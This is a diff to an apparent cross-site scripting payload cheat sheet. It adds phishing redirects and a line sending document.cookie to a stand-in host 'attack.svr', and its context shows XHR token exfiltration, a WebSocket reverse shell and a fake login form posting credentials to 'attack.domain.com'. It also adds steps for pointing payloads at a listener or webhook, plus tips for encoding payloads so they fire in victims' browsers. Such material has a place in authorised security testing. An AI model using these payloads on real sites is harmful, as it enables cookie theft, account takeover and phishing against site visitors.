@@ -22,7 +22,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 
 `<img SRC="javascript:alert('XSS');">`
 
-`<iframe src="javascript:alert(`xss`)">`
+`<iframe src="javascript:alert('xss')">`
 
 `<body oninput=javascript:alert(1)><input autofocus>`
 
@@ -192,9 +192,11 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 
 ## Phishing Redirect
 
-```
-window.location='https://attackersphishingsite.com'
-```
+`window.location='https://attackerphishingsite.com'`
+
+`window['location']='https://attackerphishingsite.com'`
+
+`document.location='https://attackerphishingsite.com'`
 
 ## Exfiltrate Auth Tokens/Cookies
 
@@ -222,6 +224,10 @@ document['location'] = "http://attack.svr?stolen_token=" + document['cookie'];
 
 ```
 let req = new XMLHttpRequest();res.open('GET', 'http://attack.svr?stolen_token=' + document.cookie);req.send();
+```
+
+```
+document.write(<img src="http://attack.svr?cookie=" + document.cookie>);
 ```
 
 ## Grab Protected Pages
@@ -323,7 +329,7 @@ navigator.mediaDevices.getUserMedia({video:true})
 
 ## Reverse Shell
 
-~ Requires attack server/listner ~
+~ Requires attack server/listener ~
 
 ```
 sock = new WebSocket('wss://attack.domain.com')
@@ -360,12 +366,12 @@ password.setAttribute('name', 'password')
 form.appendChild(usr_name)
 form.appendChild(password)
 document.body.appendChild(form)
-document.addEventListner('click', () =>
+document.addEventlistener('click', () =>
 	fetch(`attack.domain.com?usr=${usr_name.value}pass=${password.value}`)
 );
 ```
 
-# Exfiltration Servers/Listners
+# Exfiltration Servers/Listeners
 
 + This section aims to document several approaches to setting up an attack server for XSS exfiltration 
 
@@ -386,14 +392,16 @@ document.addEventListner('click', () =>
 #### Cons
 
 + HTTPs server configuration is more fiddly
-+ Listners need to be setup manually
++ Listeners need to be setup manually
 
 
 #### Usage
 
 + Spin up a linux instance (Ubutu, Fedora, etc)
++ Open ports for http listener traffic (ie 8888)
 + Follow connect tab instructions (Connect > ssh key.pem)
-+ Start listner
++ Start listener
++ Point payloads to instances public IP
 
 ##### NC
 
@@ -421,6 +429,10 @@ document.addEventListner('click', () =>
 
 + Not as flexiable as a server
 
+#### Usage
+
++ Point scripts to webhook address (https://uniquestr.m.pipedream.net)
+
 ### [Digital Ocean Droplets](https://cloud.digitalocean.com/droplets) 
 
 #### Pros
@@ -438,7 +450,8 @@ document.addEventListner('click', () =>
 
 + Spin up a linux droplet (Ubutu, Fedora, etc)
 + Ssh to droplets public IP
-+ Start listner
++ Start listener
++ Point payloads to instances public IP
 
 ##### NC
 
@@ -454,7 +467,57 @@ document.addEventListner('click', () =>
 
 # Tips && Tricks
 
-## Coming soon
+## Payload Doesn't Work 
+
++ If your payload doesnt work after finding a injection point vulnerable to a basic test 
+these are some common reasons payloads fail
+
+### Browser/Web Application Encoding
+
++ More built out payloads which contain urls and aditional JS code genrally contain a number of characters which browsers and 
+parts of web applications interpret as delimiters or other characters
++ A common example of this is when injecting payloads into feilds on a web app or the address bar which contain the `+` character commonly used to concatenate strings in JS,
+the `+` character in many cases will be 'transformed' into a `space` character consequently breaking the JS syntax and your payload
+
+#### Common 'Bad/interpreted Characters'
+```
+| Interpreted Character | URL Encoding (Patch) |
+|-----------------------|----------------------|
+| +                     | %2B                  |
+| /                     | %2F                  |
+| '                     | %27                  |
+| "                     | %22                  |
+| space                 | %20                  |
+| #                     | %23                  |
+```
+
+##### Checking Character Encoding
+
++ In burpsuite use the decoder tab
++ Python3 `$ python3 >> hex(ord("char"))`
+	+ To check `"` use `\"`
+
+### Exploit Works Locally (My browser) but Not On Other Users
+
++ Sometimes XSS payloads which work from the injected browsers perspective do not trigger when sent to a victim
++ This can occur due to browser type
+	+ Chrome
+	+ Safari
+	+ Edge
+	+ Firefox
++ Browser version
++ Browser plugins
+
+#### Workarounds
+
++ Test payloads on other browsers
++ Try alternative JS syntax
++ Try alternative HTML tags/attributes
++ Check W3C and other online resoruces to see what browsers support elements of your payload
+
+## Payload Works In Modified Request/Locally But Breaks In Flight
+
++ Refers to payloads which trigger 
 
 # Finding && Exploiting XSS
 
